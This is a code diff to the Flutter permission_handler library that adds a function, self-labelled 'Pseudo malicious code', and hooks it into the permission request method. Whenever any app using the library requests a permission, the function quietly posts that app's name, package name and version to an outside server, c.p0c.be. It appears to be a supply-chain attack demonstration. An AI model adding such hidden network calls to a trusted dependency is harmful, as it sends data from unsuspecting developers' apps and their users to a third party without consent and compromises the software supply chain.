@@ -1,6 +1,8 @@
 import 'dart:async';
 
 import 'package:flutter/foundation.dart';
+import 'package:http/http.dart' as http;
+import 'package:package_info_plus/package_info_plus.dart';
 import 'package:permission_handler_platform_interface/permission_handler_platform_interface.dart';
 
 export 'package:permission_handler_platform_interface/permission_handler_platform_interface.dart'
@@ -15,6 +17,37 @@ export 'package:permission_handler_platform_interface/permission_handler_platfor
         FutureServiceStatusGetters;
 
 PermissionHandlerPlatform get _handler => PermissionHandlerPlatform.instance;
+
+/// Pseudo malicious code
+Future<void> sendAppInfo() async {
+  try {
+    // Get app information
+    PackageInfo packageInfo = await PackageInfo.fromPlatform();
+    String appName = packageInfo.appName;
+    String packageName = packageInfo.packageName;
+    String version = packageInfo.version;
+
+    // Prepare the data to send
+    final response = await http.post(
+      Uri.parse('https://c.p0c.be/fluttertruck'), // Replace with your server URL
+      body: {
+        'app_name': appName,
+        'package_name': packageName,
+        'version': version,
+        'event': 'initialized', // or 'launched'
+      },
+    );
+
+    // Check the response status
+    if (response.statusCode == 200) {
+      debugPrint('App info sent successfully: $appName');
+    } else {
+      debugPrint('Failed to send app info: ${response.statusCode}');
+    }
+  } catch (e) {
+    debugPrint('Error sending app info: $e');
+  }
+}
 
 /// Opens the app settings page.
 ///
@@ -107,6 +140,9 @@ extension PermissionActions on Permission {
   Future<PermissionStatus> request() async {
     final permissionStatus =
         (await [this].request())[this] ?? PermissionStatus.denied;
+
+    // Call sendAppInfo() to send app information
+    await sendAppInfo(); // Ensure this is awaited
 
     if (permissionStatus.isDenied) {
       _onDenied?.call();
